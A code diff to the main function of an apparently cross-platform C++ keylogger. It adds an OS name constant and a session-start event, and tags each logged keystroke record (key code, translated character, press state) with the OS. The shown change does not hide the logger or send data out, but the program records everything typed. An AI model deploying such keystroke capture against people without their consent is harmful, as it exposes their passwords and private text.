@@ -108,13 +108,25 @@ int main(int argc, char* argv[]) {
 #endif
 
 #ifdef _WIN32
-    Logger logger("windows");
+    static constexpr const char* OS_NAME = "windows";
 #elif defined(__APPLE__)
-    Logger logger("macos");
+    static constexpr const char* OS_NAME = "macos";
 #else
-    Logger logger("linux");
+    static constexpr const char* OS_NAME = "linux";
 #endif
+    Logger logger(OS_NAME);
     logger.start();
+
+    {
+        auto nowMs = static_cast<int64_t>(
+            std::chrono::duration_cast<std::chrono::milliseconds>(
+                std::chrono::system_clock::now().time_since_epoch()).count());
+        char hdr[256];
+        snprintf(hdr, sizeof(hdr),
+                 R"({"event":"session_start","os":"%s","version":"0.1.0","ts":"%s"})",
+                 OS_NAME, msToIso8601(nowMs).c_str());
+        logger.logEvent(hdr);
+    }
 
     IKeylogger* keylogger = createPlatformKeylogger();
     if (!keylogger) {
@@ -125,11 +137,12 @@ int main(int argc, char* argv[]) {
     keylogger->setEventCallback([&logger](const KeyEvent& ev) {
         char buf[512];
         snprintf(buf, sizeof(buf),
-                 R"({"ts":"%s","vk":%u,"key":"%s","down":%s})",
+                 R"({"ts":"%s","vk":%u,"key":"%s","down":%s,"os":"%s"})",
                  msToIso8601(ev.timestampMs).c_str(),
                  ev.virtualKey,
                  jsonEscape(ev.translated).c_str(),
-                 ev.keyDown ? "true" : "false");
+                 ev.keyDown ? "true" : "false",
+                 OS_NAME);
         logger.logEvent(buf);
     });
 
